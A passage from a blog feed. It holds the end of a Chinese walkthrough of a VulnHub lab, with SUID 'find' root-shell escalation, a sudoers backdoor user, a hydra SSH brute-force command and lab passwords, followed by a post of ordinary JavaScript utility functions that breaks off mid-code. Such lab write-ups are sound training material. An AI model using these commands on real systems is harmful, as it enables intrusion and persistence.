But perhaps it's not that easy.  Or maybe it is?您可以使用相同的方法在根目录中查找或访问标志吗？可能。但也许不是那么容易。或许是这样？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在根目录查找？</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#用find'随便查找一个文件 然后-exec 来启shell</span><span class="token function">find</span> ./ xxx <span class="token parameter variable">-exec</span> <span class="token string">'/bin/sh'</span> <span class="token punctuation">\</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>得到一个有root权限的shell</p></li><li><p><code>cd</code> 到<code>/root</code>下:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 有一个thefinalflag.txt文件</span><span class="token function">cat</span> thefinalflag.txtWell done<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>Hopefully you've enjoyed this and learned some new skills.You can <span class="token builtin class-name">let</span> me know what you thought of this little journeyby contacting me via Twitter - @DCAU7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>完成了~</p></li><li><p>给他留个用户吧~</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#创建一个可以登录的用户在root并设置密码</span><span class="token function">useradd</span> rex <span class="token parameter variable">-m</span> <span class="token parameter variable">-s</span> /bin/bash <span class="token parameter variable">-d</span> /home/rex <span class="token parameter variable">-g</span> root<span class="token punctuation">;</span><span class="token function">passwd</span> rex<span class="token comment">#给他root权限</span><span class="token function">chmod</span> u+w /etc/sudoers<span class="token punctuation">;</span><span class="token builtin class-name">echo</span> <span class="token string">'rex  ALL=(ALL:ALL) ALL'</span> <span class="token operator">>></span> /etc/sudoers<span class="token punctuation">;</span><span class="token function">chmod</span> u-w /etc/sudoers<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>不料：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/bin/sh: <span class="token number">20</span>: useradd: not found <span class="token comment">#没有useradd这个命令？</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>额嘿嘿，5个flag都拿到了，算了算了。</p></li><li><p>后来爆破了flag4的密码：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#爆破密码：</span>hydra <span class="token parameter variable">-l</span> flag4 <span class="token parameter variable">-P</span> /tmp/password.lst <span class="token parameter variable">-t</span> <span class="token number">5</span> ssh://192.168.0.119<span class="token comment"># 密码字典在 /usr/share/john/password.lst</span><span class="token comment"># 也可以自己定制</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>​    </p><h2 id="2-重要信息"><a href="#2-重要信息" class="headerlink" title="2. 重要信息"></a>2. 重要信息</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#1. mysql 账号密码：</span>user：dbuser passwd：R0ck3t<span class="token comment">#2. ssh 的账号密码：</span>user：flag4 <span class="token function">passwd</span> orange<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-FLAG"><a href="#3-FLAG" class="headerlink" title="3. FLAG"></a>3. FLAG</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"># flag1# 在网站的目录下# 内容是：Every good <span class="token constant">CMS</span> needs a config file <span class="token operator">-</span> and so <span class="token keyword">do</span> you<span class="token punctuation">.</span>#每一个好的<span class="token constant">CMS</span>都需要一个配置文件<span class="token operator">-</span>你也是。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># flag2</span><span class="token comment"># 在/var/www/sites/default/setting.php （网站框架的配置文件）</span><span class="token comment"># 内容是：</span><span class="token comment">/*** flag2* Brute force and dictionary attacks aren't the* only ways to gain access (and you WILL need access).* What can you do with these credentials?* 暴力和字典攻击不是* 只有获得访问权限的方法（而且您将需要访问权限）。* 你能用这些证件做什么？*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"># flag3# 在网站登录后的content里面# 内容是：<span class="token string">"Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow."</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"># flag4# <span class="token operator">/</span>home<span class="token operator">/</span>flag4<span class="token operator">/</span>flag4<span class="token punctuation">.</span>txt 在服务器用户‘flag4’家目录下的flag4<span class="token punctuation">.</span>txt# 内容是：<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Can you use this same method to find or access the flag in root?</span><span class="token template-punctuation string">`</span></span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Probably. But perhaps it's not that easy.  Or maybe it is?</span><span class="token template-punctuation string">`</span></span># 您可以使用相同的方法在根目录中查找或访问标志吗？# 可能。但也许不是那么容易。或许是这样？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"># flag5# <span class="token operator">/</span>root<span class="token operator">/</span>thefinalflag<span class="token punctuation">.</span>txt root用户目录下的thefinalflag<span class="token punctuation">.</span>txt文件# 内容是：<span class="token string">"Well done!!!!"</span><span class="token string">"Hopefully you've enjoyed this and learned some new skills."</span><span class="token string">"You can let me know what you thought of this little journey"</span><span class="token string">"by contacting me via Twitter - @DCAU7"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-补充知识"><a href="#4-补充知识" class="headerlink" title="4. 补充知识"></a>4. 补充知识</h2><h3 id="find命令提权"><a href="#find命令提权" class="headerlink" title="find命令提权"></a>find命令提权</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-exec</span> <span class="token string">'/bin/sh'</span> <span class="token punctuation">\</span><span class="token punctuation">;</span> <span class="token comment">#如果find命令是-r-sr-sr-x权限那执行之后回获得一个root的shell</span><span class="token comment">#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null <span class="token comment">#查找 suid的文件</span><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-exec</span> <span class="token function">ls</span> <span class="token parameter variable">-ldb</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> penetration-test </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用的JS的工具函数</title>
      <link href="/js-tools/"/>
      <url>/js-tools/</url>
      
        <content type="html"><![CDATA[<h1 id="一些JS的工具函数"><a href="#一些JS的工具函数" class="headerlink" title="一些JS的工具函数"></a>一些JS的工具函数</h1><h2 id="下载指定内容到本地"><a href="#下载指定内容到本地" class="headerlink" title="下载指定内容到本地"></a>下载指定内容到本地</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">downloadContent</span><span class="token punctuation">(</span><span class="token parameter">content<span class="token punctuation">,</span> filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> urlObject <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token constant">URL</span> <span class="token operator">||</span> window<span class="token punctuation">.</span>webkitURL <span class="token operator">||</span> window  <span class="token keyword">const</span> downloadData <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span>content<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> save_link <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElementNS</span><span class="token punctuation">(</span><span class="token string">'http://www.w3.org/1999/xhtml'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>  save_link<span class="token punctuation">.</span>href <span class="token operator">=</span> urlObject<span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span>downloadData<span class="token punctuation">)</span>  save_link<span class="token punctuation">.</span>download <span class="token operator">=</span> filename  <span class="token keyword">const</span> ev <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createEvent</span><span class="token punctuation">(</span><span class="token string">'MouseEvents'</span><span class="token punctuation">)</span>  ev<span class="token punctuation">.</span><span class="token function">initMouseEvent</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> window<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span>  save_link<span class="token punctuation">.</span><span class="token function">dispatchEvent</span><span class="token punctuation">(</span>ev<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="生成随机RGBA颜色"><a href="#生成随机RGBA颜色" class="headerlink" title="生成随机RGBA颜色"></a>生成随机RGBA颜色</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">randomRGBAColor</span><span class="token punctuation">(</span><span class="token parameter">a <span class="token operator">=</span> <span class="token number">1</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">//a表示透明度 0~1 之间 随机可以传递函数[Math.random()]</span>  <span class="token keyword">const</span> r <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">256</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> g <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">256</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> b <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">256</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">rgba(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>r<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>g<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>b<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">,</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>a<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">)</span><span class="token template-punctuation string">`</span></span> <span class="token comment">//返回rgba(r,g,b,a)格式颜色</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="生成随机HEX颜色"><a href="#生成随机HEX颜色" class="headerlink" title="生成随机HEX颜色"></a>生成随机HEX颜色</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">randomHexColor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token string">'#'</span> <span class="token operator">+</span>    <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">color</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token punctuation">(</span>color <span class="token operator">+=</span> <span class="token string">'0123456789abcdef'</span><span class="token punctuation">[</span>Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> color<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">6</span> <span class="token operator">?</span> color <span class="token operator">:</span> arguments<span class="token punctuation">.</span><span class="token function">callee</span><span class="token punctuation">(</span>color<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>  <span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="获取元素到文档区域的坐标"><a href="#获取元素到文档区域的坐标" class="headerlink" title="获取元素到文档区域的坐标"></a>获取元素到文档区域的坐标</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">getPosition</span><span class="token punctuation">(</span><span class="token parameter">element</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> actualLeft <span class="token operator">=</span> element<span class="token punctuation">.</span>offsetLeft<span class="token punctuation">,</span>    actualTop <span class="token operator">=</span> element<span class="token punctuation">.</span>offsetTop<span class="token punctuation">,</span>    current <span class="token operator">=</span> element<span class="token punctuation">.</span>offsetParent <span class="token comment">// 取得元素的offsetParent</span>  <span class="token comment">// 一直循环直到根元素</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>current <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    actualLeft <span class="token operator">+=</span> current<span class="token punctuation">.</span>offsetLeft    actualTop <span class="token operator">+=</span> current<span class="token punctuation">.</span>offsetTop    current <span class="token operator">=</span> current<span class="token punctuation">.</span>offsetParent  <span class="token punctuation">&#125;</span>  <span class="token comment">// 返回包含left、top坐标的对象</span>  <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">left</span><span class="token operator">:</span> actualLeft<span class="token punctuation">,</span>    <span class="token literal-property property">top</span><span class="token operator">:</span> actualTop<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="textarea输入Tab的处理"><a href="#textarea输入Tab的处理" class="headerlink" title="textarea输入Tab的处理"></a>textarea输入Tab的处理</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">addTabEvent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'textarea'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'keydown'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>keyCode <span class="token operator">===</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      e<span class="token punctuation">.</span><span class="token function">preventDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">let</span> indent <span class="token operator">=</span> <span class="token string">'    '</span><span class="token punctuation">,</span> <span class="token comment">//空格数可选</span>        start <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>selectionStart<span class="token punctuation">,</span>        end <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>selectionEnd<span class="token punctuation">,</span>        selected <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">getSelection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      selected <span class="token operator">=</span> indent <span class="token operator">+</span> selected<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\n</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">'\n'</span> <span class="token operator">+</span> indent<span class="token punctuation">)</span>      <span class="token keyword">this</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> start<span class="token punctuation">)</span> <span class="token operator">+</span> selected <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>end<span class="token punctuation">)</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">setSelectionRange</span><span class="token punctuation">(</span>start <span class="token operator">+</span> indent<span class="token punctuation">.</span>length<span class="token punctuation">,</span> start <span class="token operator">+</span> selected<span class="token punctuation">.</span>length<span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token boolean">false</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="计算一个字符串数组中最大宽度"><a href="#计算一个字符串数组中最大宽度" class="headerlink" title="计算一个字符串数组中最大宽度"></a>计算一个字符串数组中最大宽度</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">calculateMaxWidth</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> fontSize <span class="token operator">=</span> <span class="token string">'1rem'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> width <span class="token operator">=</span> <span class="token number">0</span>  <span class="token keyword">let</span> html <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'span'</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> maxlength <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token operator">...</span>arr<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">s</span> <span class="token operator">=></span> <span class="token punctuation">(</span>s <span class="token operator">?</span> s<span class="token punctuation">.</span>length <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> string <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token parameter">s</span> <span class="token operator">=></span> <span class="token punctuation">(</span>s<span class="token operator">?.</span>length <span class="token operator">||</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">===</span> maxlength<span class="token punctuation">)</span>  html<span class="token punctuation">.</span>innerText <span class="token operator">=</span> str  html<span class="token punctuation">.</span>className <span class="token operator">=</span> <span class="token string">'getTextWidth'</span>  html<span class="token punctuation">.</span>style<span class="token punctuation">.</span>fontSize <span class="token operator">=</span> fontSize  document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'body'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>  width <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.getTextWidth'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>offsetWidth  document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.getTextWidth'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token punctuation">&#123;</span> width<span class="token punctuation">,</span> string <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="读取Excel表格"><a href="#读取Excel表格" class="headerlink" title="读取Excel表格"></a>读取Excel表格</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">/*** * e.g.: * document.getElementById('file').onchange = function()&#123; *    readExcel(this.files).then(data=>&#123; *      console.log(data) *    &#125;) *  &#125; * @param files * @param rABS * @returns &#123;Promise&#125; */</span><span class="token keyword">function</span> <span class="token function">readExcel</span><span class="token punctuation">(</span><span class="token parameter">files<span class="token punctuation">,</span> rABS <span class="token operator">=</span> <span class="token boolean">false</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">function</span> <span class="token function">bin2str</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> o <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span>      l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>      w <span class="token operator">=</span> <span class="token number">10240</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> data<span class="token punctuation">.</span>byteLength <span class="token operator">/</span> w<span class="token punctuation">;</span> <span class="token operator">++</span>l<span class="token punctuation">)</span> o <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>l <span class="token operator">*</span> w<span class="token punctuation">,</span> l <span class="token operator">*</span> w <span class="token operator">+</span> w<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    o <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>l <span class="token operator">*</span> w<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> o  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">XLSX</span><span class="token punctuation">)</span> <span class="token function">reject</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Require Import SheetJS! More Information:http://sheetjs.com'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">const</span> filesLength <span class="token operator">=</span> files<span class="token punctuation">.</span>length    <span class="token keyword">const</span> resultList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">let</span> cursor <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">const</span> <span class="token function-variable function">handleLoader</span> <span class="token operator">=</span> <span class="token parameter">e</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> result <span class="token operator">=</span> e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result        resultList<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>rABS <span class="token operator">?</span> <span class="token constant">XLSX</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token function">btoa</span><span class="token punctuation">(</span><span class="token function">bin2str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'base64'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token constant">XLSX</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>result<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'binary'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">++</span>cursor <span class="token operator">===</span> filesLength<span class="token punctuation">)</span> <span class="token function">resolve</span><span class="token punctuation">(</span>resultList<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">reject</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token operator">...</span>files<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">file</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      reader<span class="token punctuation">[</span>rABS <span class="token operator">?</span> <span class="token string">'readAsArrayBuffer'</span> <span class="token operator">:</span> <span class="token string">'readAsBinaryString'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span>      reader<span class="token punctuation">.</span>onload <span class="token operator">=</span> handleLoader    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">/** 获取表格的行列数 var range = XLSX.utils.decode_range(worksheet['!ref']); var ncols = range.e.c - range.s.c + 1, rows = range.e.r - range.s.r + 1; 更多API：https://blog.csdn.net/qq_35606400/article/details/112348670 */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="监听页面显示-x2F-隐藏事件"><a href="#监听页面显示-x2F-隐藏事件" class="headerlink" title="监听页面显示&#x2F;隐藏事件"></a>监听页面显示&#x2F;隐藏事件</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> hiddenProperty <span class="token operator">=</span>  <span class="token string">'hidden'</span> <span class="token keyword">in</span> document <span class="token operator">?</span> <span class="token string">'hidden'</span> <span class="token operator">:</span> <span class="token string">'webkitHidden'</span> <span class="token keyword">in</span> document <span class="token operator">?</span> <span class="token 